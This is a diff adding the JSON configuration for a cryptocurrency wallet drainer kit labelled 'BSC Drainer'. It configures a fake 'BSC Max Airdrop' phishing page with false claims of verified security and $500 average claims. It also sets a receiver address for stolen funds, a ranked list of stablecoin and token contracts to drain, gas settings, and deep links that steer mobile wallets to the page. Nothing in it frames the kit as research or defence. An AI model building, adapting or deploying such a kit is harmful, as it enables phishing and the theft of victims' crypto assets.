@@ -1,0 +1,125 @@
+{
+  "name": "BSC Drainer",
+  "version": "1.0.0",
+  "description": "BSC wallet drainer adapted from ETH version",
+  "network": {
+    "chainId": 56,
+    "chainIdHex": "0x38",
+    "name": "BSC Mainnet",
+    "currency": {
+      "name": "BNB",
+      "symbol": "BNB",
+      "decimals": 18
+    },
+    "rpcUrls": [
+      "https://bsc-dataseed.binance.org/",
+      "https://bsc-dataseed1.binance.org/",
+      "https://bsc-dataseed2.binance.org/"
+    ],
+    "blockExplorerUrls": [
+      "https://bscscan.com/"
+    ]
+  },
+  "receiver": {
+    "address": "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
+    "note": "Replace with your BSC address"
+  },
+  "branding": {
+    "projectName": "BSC Max Airdrop",
+    "description": "Claim your exclusive BSC Max tokens",
+    "theme": {
+      "primaryColor": "#F0B90B",
+      "secondaryColor": "#FF8F00",
+      "accentColor": "#FFC107"
+    }
+  },
+  "walletConnect": {
+    "projectId": "435fa3916a5da648144afac1e1b4d3f2",
+    "metadata": {
+      "name": "BSC Max Airdrop",
+      "description": "Claim your BSC Max airdrop tokens - Connect any BSC-compatible wallet",
+      "icons": ["https://walletconnect.com/walletconnect-logo.png"]
+    }
+  },
+  "tokens": {
+    "priorityTokens": [
+      "USDT", "USDC", "BUSD", "CAKE", "WBNB"
+    ],
+    "contracts": [
+      {
+        "symbol": "USDT",
+        "address": "0x55d398326f99059fF775485246999027B3197955",
+        "decimals": 18,
+        "priority": 1
+      },
+      {
+        "symbol": "USDC", 
+        "address": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+        "decimals": 18,
+        "priority": 2
+      },
+      {
+        "symbol": "BUSD",
+        "address": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", 
+        "decimals": 18,
+        "priority": 3
+      },
+      {
+        "symbol": "CAKE",
+        "address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
+        "decimals": 18,
+        "priority": 4
+      },
+      {
+        "symbol": "WBNB",
+        "address": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "decimals": 18,
+        "priority": 5
+      }
+    ]
+  },
+  "gas": {
+    "standardTransfer": 21000,
+    "tokenTransfer": 65000,
+    "bufferPercentage": 20,
+    "maxGasPrice": "20000000000"
+  },
+  "mobile": {
+    "deepLinks": {
+      "metamask": "https://metamask.app.link/dapp/",
+      "trustwallet": "https://link.trustwallet.com/open_url?coin_id=56&url=",
+      "binance": "https://www.binance.org/en/smartChain?dapp=",
+      "tokenpocket": "https://www.tokenpocket.pro/en/download/app?dapp=",
+      "safepal": "https://safepal.io/download?dapp="
+    },
+    "connectionTimeout": 30000
+  },
+  "features": [
+    {
+      "icon": "⚡",
+      "text": "Lightning-fast BSC transactions"
+    },
+    {
+      "icon": "💰", 
+      "text": "High-value token distribution"
+    },
+    {
+      "icon": "🔒",
+      "text": "Secure smart contract verified"
+    },
+    {
+      "icon": "🌟",
+      "text": "Exclusive early access rewards"
+    }
+  ],
+  "stats": [
+    {
+      "number": "50,000+",
+      "label": "Tokens Distributed"
+    },
+    {
+      "number": "$500",
+      "label": "Average Claim Value"
+    }
+  ]
+}
